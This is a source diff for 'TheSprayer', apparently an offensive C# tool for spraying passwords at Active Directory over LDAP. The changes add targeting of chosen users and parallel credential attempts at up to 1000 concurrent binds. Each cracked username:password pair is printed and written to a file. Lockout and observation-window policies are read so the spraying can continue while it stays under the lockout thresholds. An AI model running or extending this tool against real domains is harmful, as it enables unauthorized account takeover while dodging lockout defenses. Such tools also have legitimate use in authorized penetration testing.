@@ -5,6 +5,9 @@ using TheSprayer.Models;
 using System.Collections.Generic;
 using TheSprayer.Extensions;
 using System.Linq;
+using TheSprayer.Helpers;
+using System.Threading.Tasks;
+using System.Diagnostics;
 
 namespace TheSprayer
 {
@@ -181,8 +184,7 @@ namespace TheSprayer
                             break;
                         }
                     }
-                    //Console.WriteLine("\r\nLDAP Cookie:{0}", prc.Cookie);
-                    //Console.WriteLine("\r\nSearch Response Entries:{0}", searchResponse.Entries.Count);
+
                     // Loop through every response
                     foreach (SearchResultEntry entry in searchResponse.Entries)
                     {
@@ -220,20 +222,30 @@ namespace TheSprayer
             return adUsers;
         }
 
-        public bool IsUserActive(int userAccountControlValue)
+        public static bool IsUserActive(int userAccountControlValue)
         {
             return !Convert.ToBoolean(userAccountControlValue & 0x0002);
         }
 
-        public void SprayPasswords(string[] passwords, int attemptsToLeave = 2, string outputFile = null)
+        public void SprayPasswords(IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, string outputFile = null)
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
             var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
             var users = GetAllDomainUsers();
 
-            Console.WriteLine("Filtering disabled and nearly locked users");
+            if (usersToSpray != null)
+            {
+                users = users.Where(u => usersToSpray.Contains(u.SamAccountName)).ToList();
+                if (!users.Any())
+                {
+                    Console.WriteLine("No users, exiting!");
+                    return;
+                }
+            }
+
+            Console.WriteLine("Filtering disabled and nearly locked users...");
             List<ActiveDirectoryUser> filteredUsers = new();
-            foreach(var user in users)
+            foreach (var user in users)
             {
                 if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                 {
@@ -243,32 +255,47 @@ namespace TheSprayer
 
             foreach (var password in passwords)
             {
-                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} users...");
-                foreach (var user in filteredUsers.ToList())
+                //If we have no more users, don't continue
+                if (filteredUsers.Count == 0)
                 {
-                    if (TryValidateCredentials(user.SamAccountName, password, out var message))
-                    {
-                        Console.WriteLine($"{user.SamAccountName}:{password}");
-                        if (!string.IsNullOrWhiteSpace(outputFile))
-                        {
-                            using var sw = System.IO.File.CreateText(outputFile);
-                            sw.WriteLine($"{user.SamAccountName}:{password}");
-                        }
-                    }
-                    else //Increment users bad password attempts and remove if close to lockout
-                    {
-                        user.BadPasswordAttempts++;
-                        user.LastBadPasswordTime = DateTime.Now;
-                        if(!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
-                        {
-                            filteredUsers.Remove(user);
-                        }
-                    }
+                    Console.WriteLine($"{users.Count} users found but they are all at risk of lockout, exiting.");
+                    return;
                 }
+
+                //Try the current password
+                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} of {users.Count} user{(users.Count > 1 ? "s" : "")}...");
+                Parallel.ForEach(
+                    filteredUsers.ToList(), 
+                    new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
+                    user =>
+                    {
+                        if (TryValidateCredentials(user.SamAccountName, password, out var message))
+                        {
+                            ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
+                            if (!string.IsNullOrWhiteSpace(outputFile))
+                            {
+                                lock (outputFile)
+                                {
+                                    using var sw = System.IO.File.CreateText(outputFile);
+                                    sw.WriteLine($"{user.SamAccountName}:{password}");
+                                }
+                            }
+                        }
+                        else //Increment users bad password attempts and remove if close to lockout
+                        {
+                            user.BadPasswordAttempts++;
+                            user.LastBadPasswordTime = DateTime.Now;
+                            if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                            {
+                                filteredUsers.Remove(user);
+                            }
+                        }
+                    }
+                );
             }
         }
 
-        public bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
+        public static bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
         {
             var policyName = user.PasswordPolicyName;
             PasswordPolicy policy;
@@ -304,7 +331,7 @@ namespace TheSprayer
                     // Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}
                     return true;
                 }
-                else if(user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
+                else if (user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
                 {
                     // User hasn't had an incorrect password in at least the observation window, we can try again
                     return true;
@@ -326,14 +353,14 @@ namespace TheSprayer
         {
             LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
             connection.Credential = new NetworkCredential(username, password, _domain);
-            
+
             try
             {
                 connection.Bind();
                 message = "Success!";
                 return true;
             }
-            catch(LdapException e)
+            catch (LdapException e)
             {
                 message = e.Message;
                 return false;
